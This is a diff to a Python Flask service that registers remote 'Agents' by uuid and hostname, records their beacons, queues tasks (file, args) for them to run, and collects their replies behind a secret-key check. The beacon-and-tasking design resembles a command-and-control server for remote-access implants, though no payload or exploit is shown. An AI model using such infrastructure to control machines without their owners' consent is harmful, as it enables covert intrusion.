@@ -18,6 +18,23 @@ serviceConf: dict = {
     "logging": bool(),
     "secret_key": None}
 
+def is_valid_key(key: str):
+    from .settings import secret_key
+    if key is None:
+        if serviceConf["logging"]: print(f"{Color.Red}::{Color.White} No key was given!"+Color.Reset)
+        return False
+    elif key != secret_key:
+        if serviceConf["logging"]: print(f"{Color.Red}::{Color.White} Invalid key: {key}"+Color.Reset)
+        return False
+    return True
+
+def was_given(field: str, jdata_keys: list[str]):
+    if not field in jdata_keys:
+        if serviceConf["logging"]: print(f"{Color.Red}::{Color.White} No {field} was given!"+Color.Reset)
+        return False
+    else:
+        return True
+
 @EnableMixins(globals(), "service", args=["service_dict"])
 def init_service(service_conf, service_dict = __main__.__dict__):
     global serviceConf
@@ -28,6 +45,9 @@ def init_service(service_conf, service_dict = __main__.__dict__):
 @service.route("")
 @service.route("/")
 def status():
+    """
+    Function to get the status of the api service
+    """
     if serviceConf["online"]:
         return Transport("online").dump()
     else:
@@ -35,19 +55,21 @@ def status():
 
 @service.route("/bind", methods = {"POST"})
 def bind():
+    """
+    Function to bind a Agent to the server
+    """
     jdata: dict = json.loads(Transport(request.data.decode()).load())
 
-    if not "uuid" in jdata.keys():
-        if serviceConf["logging"]: print(f"{Color.Red}::{Color.White} No uuid was given!"+Color.Reset)
+    if not was_given("uuid", jdata.keys()):
         return Transport("FAILED").dump()
     uuid: str = jdata["uuid"]
 
     if Agent.exists(uuid):
         Agent.update_beacon(uuid)
         if serviceConf["logging"]: print(f"{Color.Green}::{Color.White} Checked in Agent: {uuid}"+Color.Reset)
+    
     else:
-        if not "hostname" in jdata.keys():
-            if serviceConf["logging"]: print(f"{Color.Red}::{Color.White} No hostname given: {uuid}"+Color.Reset)
+        if not was_given("hostname", jdata.keys()):
             return Transport("FAILED").dump()
         hostname: str = jdata["hostname"]
 
@@ -58,28 +80,51 @@ def bind():
 
     return Transport("OK").dump()
 
-@service.route("/task", methods = {"GET", "POST", "DELETE"})
+@service.route("/task", methods = {"POST", "GET", "DELETE"})
 def task():
+    """
+    Function to:
+        GET The next task to execute.
+        POST A new task and add it to an Agent to be executed.
+        DELETE A task by id
+    """
+
+    if request.method == "DELETE":
+        if not is_valid_key(request.headers.get("key")):
+            return Transport("FAILED").dump()
+
+        try:
+            id = int(request.args.get('id'))
+        except:
+            if serviceConf["logging"]: print(f"{Color.Red}::{Color.White} Invalid id: {id}"+Color.Reset)
+            return Transport("FAILED").dump()
+
+        Task.delete(id)
+        if serviceConf["logging"]: print(f"{Color.Green}::{Color.White} Deleted Task by id: {id}"+Color.Reset)
+        return Transport("OK").dump()
+
     jdata: dict = json.loads(Transport(request.data.decode()).load())
 
-    if not "uuid" in jdata.keys():
-        if serviceConf["logging"]: print(f"{Color.Red}::{Color.White} No uuid was given!"+Color.Reset)
+    if not was_given("uuid", jdata.keys()):
         return Transport("FAILED").dump()
     uuid: str = jdata["uuid"]
 
     if not Agent.exists(uuid):
-        if serviceConf["logging"]: print(f"{Color.Red}::{Color.White} Invalid uuid!"+Color.Reset)
+        if serviceConf["logging"]: print(f"{Color.Red}::{Color.White} Agent {uuid} dose not exist!"+Color.Reset)
         return Transport("FAILED").dump()
 
     if request.method == "POST":
-        if not "task" in jdata.keys():
-            if serviceConf["logging"]: print(f"{Color.Red}::{Color.White} No task was given!"+Color.Reset)
+        if not is_valid_key(request.headers.get("key")):
+            return Transport("FAILED").dump()
+
+        if not was_given("task", jdata.keys()):
             return Transport("FAILED").dump()
         jtask = jdata["task"]
         keys = jtask.keys()
     
-        if not "file" in keys or not "args" in keys or not "verbose" in keys:
-            if serviceConf["logging"]: print(f"{Color.Red}::{Color.White} No file, args or verbose atribute for task was given!"+Color.Reset)
+        if not was_given("file", keys) or \
+        not was_given("args", keys) or \
+        not was_given("verbose", keys):
             return Transport("FAILED").dump()
         file: str = jtask["file"]
         args: list[str] = json.dumps(jtask["args"])
@@ -90,39 +135,41 @@ def task():
         db.session.add(newTask)
         db.session.commit()
 
-        if serviceConf: print(f"{Color.Green}::{Color.White} Added new Task for Agent: {uuid}"+Color.Reset)
-
+        if serviceConf["logging"]: print(f"{Color.Green}::{Color.White} Added new Task for Agent: {uuid}"+Color.Reset)
         return Transport(str(newTask.id)).dump()
-    else:
+
+    elif request.method == "GET":
         Agent.update_beacon(uuid)
+
         if serviceConf["logging"]: print(f"{Color.Green}::{Color.White} Geting next Task for Agent: {uuid}"+Color.Reset)
         task = Agent.get_nextTask(uuid)
+
         if task != None:
             return Transport(task.jsonify()).dump()
-        return Transport("NONE").dump()
+        else:
+            return Transport("NONE").dump()
+        
+        
 
 @service.route("/reply", methods = {"POST", "GET"})
 def reply():
-    jdata: dict = json.loads(Transport(request.data.decode()).load())
-
-    if not "task_id" in jdata.keys():
-        if serviceConf["logging"]: print(f"{Color.Red}::{Color.White} No task_id was given!"+Color.Reset)
-        return Transport("FAILED").dump()
-    task_id: str = jdata["task_id"]
-
     if request.method == "POST":
-        if not "uuid" in jdata.keys():
-            if serviceConf["logging"]: print(f"{Color.Red}::{Color.White} No uuid was given!"+Color.Reset)
+        jdata: dict = json.loads(Transport(request.data.decode()).load())
+
+        if not was_given("task_id", jdata.keys()):
+            return Transport("FAILED").dump()
+        task_id: str = jdata["task_id"]
+
+        if not was_given("uuid", jdata.keys()):
             return Transport("FAILED").dump()
         uuid: str = jdata["uuid"]
 
         if not Agent.exists(uuid):
-            if serviceConf["logging"]: print(f"{Color.Red}::{Color.White} Invalid uuid!"+Color.Reset)
+            if serviceConf["logging"]: print(f"{Color.Red}::{Color.White} Agent {uuid} dose not exist!"+Color.Reset)
             return Transport("FAILED").dump()
         Agent.update_beacon(uuid)
 
-        if not "content" in jdata.keys():
-            if serviceConf["logging"]: print(f"{Color.Red}::{Color.White} No content was given!"+Color.Reset)
+        if not was_given("content", jdata.keys()):
             return Transport("FAILED").dump()
         content: str = jdata["content"]
 
@@ -130,32 +177,78 @@ def reply():
         Task.get_by_id(task_id).set_reply(content)
 
         return Transport("OK").dump()
+
     else:
-        task = Task.get_by_id(task_id)
+        if not is_valid_key(request.headers.get("key")):
+            return Transport("FAILED").dump()
+
+        try:
+            id = int(request.args.get('id'))
+        except:
+            if serviceConf["logging"]: print(f"{Color.Red}::{Color.White} Invalid id: {id}"+Color.Reset)
+            return Transport("FAILED").dump()
+
+        if id is None:
+            if serviceConf["logging"]: print(f"{Color.Red}::{Color.White} No id was given!"+Color.Reset)
+            return Transport("FAILED").dump()
+
+        task = Task.get_by_id(id)
         if task is None:
             return Transport("NONE").dump()
         else:
-            if serviceConf["logging"]: print(f"{Color.Green}::{Color.White} Getting reply of Task: {task_id}"+Color.Reset)
+            print(task.get_reply())
+            if serviceConf["logging"]: print(f"{Color.Green}::{Color.White} Getting reply of Task: {id}"+Color.Reset)
             return  Transport(task.get_reply()).dump()
 
-@service.route("/agents", methods = {"DELETE", "GET"})
-def deleteAll():
-    if request.headers.get("key") == serviceConf["secret_key"]:
-        if request.method == "DELETE":
-            Agent.delete_all()
-            if serviceConf["logging"]: print(f"{Color.Magenta}::{Color.White} Deleted all Agents!"+Color.Reset)
-            return Transport("DELETED AGENTS").dump()
-        else:
-            agents = Agent.query.all()
-            if agents is None:
-                return Transport("NONE").dump()
-
-            dict_repr = dict()
-            for agent in agents:
-                jagent: dict = json.loads(agent.jsonify())
-                jagent.pop("id")
-                dict_repr[str(agent.id)] = jagent
-            return Transport(json.dumps(dict_repr)).dump()
-    else:
-        if serviceConf["logging"]: print(f"{Color.Blue}::{Color.White} Invalid key!"+Color.Reset)
+@service.route("/agents", methods = {"GET", "DELETE"})
+def agents():
+    if not is_valid_key(request.headers.get("key")):
         return Transport("FAILED").dump()
+
+    if request.method == "GET":
+        if not is_valid_key(request.headers.get("key")):
+            return Transport("FAILED").dump()
+
+        agents = Agent.query.all()
+        if agents is None:
+            return Transport("NONE").dump()
+
+        dict_repr = dict()
+        for agent in agents:
+            jagent: dict = agent.jsonify(asDict=True)
+            jagent.pop("id")
+            dict_repr[str(agent.id)] = jagent
+        return Transport(json.dumps(dict_repr)).dump()
+
+    else:
+        Agent.delete_all()
+        if serviceConf["logging"]: print(f"{Color.Green}::{Color.White} Deleted all Agents!"+Color.Reset)
+        return Transport("OK").dump()
+
+
+@service.route("/agent", methods = {"GET", "DELETE"})
+def agent():
+    if not is_valid_key(request.headers.get("key")):
+        return Transport("FAILED").dump()
+
+    try:
+        id = int(request.args.get('id'))
+    except:
+        if serviceConf["logging"]: print(f"{Color.Red}::{Color.White} Invalid id: {id}"+Color.Reset)
+        return Transport("FAILED").dump()
+
+    if id is None:
+        if serviceConf["logging"]: print(f"{Color.Red}::{Color.White} No id was given!"+Color.Reset)
+        return Transport("FAILED").dump()
+
+    if request.method == "GET":
+        agent = Agent.query.filter_by(id=id).first()
+        if agent is None:
+            if serviceConf["logging"]: print(f"{Color.Red}::{Color.White} No Agent found with id: {id}"+Color.Reset)
+            return Transport("FAIL").dump()
+        return Transport(agent.jsonify()).dump()
+
+    else:        
+        Agent.delete(id)
+        if serviceConf["logging"]: print(f"{Color.Green}::{Color.White} Deleted Agent by id: {id}"+Color.Reset)
+        return Transport("OK").dump()
